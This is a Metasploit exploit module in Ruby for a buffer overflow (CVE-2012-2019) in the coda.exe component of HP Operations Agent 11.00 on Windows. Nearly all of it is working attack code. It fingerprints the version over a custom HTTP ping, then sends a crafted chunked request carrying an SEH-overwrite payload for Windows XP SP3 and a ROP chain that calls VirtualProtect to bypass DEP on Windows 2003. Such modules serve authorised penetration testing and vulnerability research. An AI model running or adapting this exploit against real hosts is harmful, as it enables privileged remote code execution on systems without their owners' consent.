##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize
		super(
			'Name'        => 'HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow vulnerability in HP Operations Agent for
				Windows. The vulnerability exists in the HP Software Performance Core Program
				component (coda.exe) when parsing requests for the 0x34 opcode. This module has
				been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and
				Windows 2003 SP2 (DEP bypass).

				The coda.exe components runs only for localhost by default, network access must be
				granted through its configuration to be remotely exploitable. On the other hand it
				runs on a random TCP port, to make easier reconnaissance a check function is
				provided.
			},
			'Author'      => [
				'Luigi Auriemma', # Vulnerability discovery
				'juan vazquez' # Metasploit module
			],
			'Platform'    => 'win',
			'References'  =>
				[
					[ 'CVE', '2012-2019' ],
					[ 'OSVDB', '83673' ],
					[ 'BID', '54362' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-114/' ]
				],
			'Payload'        =>
				{
					'Space'          => 1024,
					'BadChars'       => "",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
					'DisableNops'    => true
				},
			'Targets'     =>
				[
					[ 'HP Operations Agent 11.00 / Windows XP SP3',
						{
							'Ret'    => 0x100e79eb, # ppr from OvSecCore.dll
							'Offset' => 2084
						}
					],
					[ 'HP Operations Agent 11.00 / Windows 2003 SP2',
						{
							'Ret'       => 0x10073c2c, # stackpivot # ADD ESP,404 # RETN from OvSecCore.dll
							'Offset'    => 2084,
							'RopOffset' => 36
						}
					]
				],
			'DefaultTarget'  => 1,
			'Privileged'     => true,
			'DisclosureDate' => 'Jul 09 2012'
		)

	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def check

		res = ping

		if not res
			return Exploit::CheckCode::Unknown
		end

		if res !~ /HTTP\/1\.1 200 OK/
			return Exploit::CheckCode::Unknown
		end

		if res =~ /server:.*coda 11.(\d+)/
			minor = $1.to_i
			if minor < 2
				return Exploit::CheckCode::Vulnerable
			else
				return Exploit::CheckCode::Safe
			end
		end

		if res =~ /server:.*coda/
			return Exploit::CheckCode::Detected
		end

		return Exploit::CheckCode::Safe

	end

	def ping

		ping_request = <<-eos
Ping /Hewlett-Packard/OpenView/BBC/ping/ HTTP/1.1
cache-control: no-cache
connection: close
content-length: 0
content-type: application/octetstream
host: #{rhost}:#{rport}
pragma: no-cache
targetid: unknown
targeturi: http://#{rhost}:#{rport}/Hewlett-Packard/OpenView/BBC/ping/
user-agent: BBC 11.00.044; coda unknown version

		eos

		connect
		sock.put(ping_request)
		res = sock.get_once(-1, 1)
		disconnect

		return res

	end

	def exploit

		peer = "#{rhost}:#{rport}"

		print_status "#{peer} - Ping host..."
		res = ping
		if not res or res !~ /HTTP\/1\.1 200 OK/ or res !~ /server:.*coda/
			print_error("#{peer} - Host didn't answer correctly to ping")
			return
		end

		connect

		http_headers = <<-eos
GET /Hewlett-Packard/OpenView/Coda/ HTTP/1.1
cache-control: no-cache
content-type: application/octetstream
expect: 100-continue
host: #{rhost}:#{rport}
pragma: no-cache
targetid: unknown
targeturi: http://[#{rhost}]:#{rport}/Hewlett-Packard/OpenView/Coda/
transfer-encoding: chunked
user-agent: BBC 11.00.044;  14

		eos

		print_status("#{peer} - Sending HTTP Expect...")
		sock.put(http_headers)
		res = sock.get_once(-1, 1)
		if not res or res !~ /HTTP\/1\.1 100 Continue/
			print_error("#{peer} - Failed while sending HTTP Expect Header")
			return
		end

		coda_request = [
			0x0000000e,
			0xffffffff,
			0x00000000,
			0x00000034, # Operation 0x8c
			0x00000002,
			0x00000002
		].pack("N*")

		if target.name =~ /Windows XP/
			bof = rand_text(target['Offset'])
			bof << generate_seh_record(target.ret)
			bof << payload.encoded
			bof << rand_text(4000) # Allows to trigger exception
		else # Windows 2003
			rop_gadgets =
				[
					0x77bb2563, # POP EAX # RETN
					0x77ba1114, # <- *&VirtualProtect()
					0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
					junk,
					0x77bb0c86, # XCHG EAX,ESI # RETN
					0x77bc9801, # POP EBP # RETN
					0x77be2265, # ptr to 'push esp #  ret'
					0x77bb2563, # POP EAX # RETN
					0x03C0990F,
					0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
					0x77bb48d3, # POP EBX, RET
					0x77bf21e0, # .data
					0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
					0x77bbfc02, # POP ECX # RETN
					0x77bef001, # W pointer (lpOldProtect) (-> ecx)
					0x77bd8c04, # POP EDI # RETN
					0x77bd8c05, # ROP NOP (-> edi)
					0x77bb2563, # POP EAX # RETN
					0x03c0984f,
					0x77bdd441, # SUB EAX, 03c0940f
					0x77bb8285, # XCHG EAX,EDX # RETN
					0x77bb2563, # POP EAX # RETN
					nop,
					0x77be6591, # PUSHAD # ADD AL,0EF # RETN
				].pack("V*")
			bof = Rex::Text.pattern_create(target['RopOffset'])
			bof << rop_gadgets
			bof << payload.encoded
			my_payload_length =  target['RopOffset'] + rop_gadgets.length + payload.encoded.length
			bof << rand_text(target['Offset'] - my_payload_length)
			bof << generate_seh_record(target.ret)
			bof << rand_text(4000) # Allows to trigger exception
		end

		coda_request << [bof.length].pack("n")
		coda_request << bof

		http_body = coda_request.length.to_s(16)
		http_body << "\x0d\x0a"
		http_body << coda_request
		http_body << "\x0d\x0a\x0d\x0a"

		print_status("#{peer} - Triggering overflow...")
		sock.put(http_body)

		disconnect
	end

end
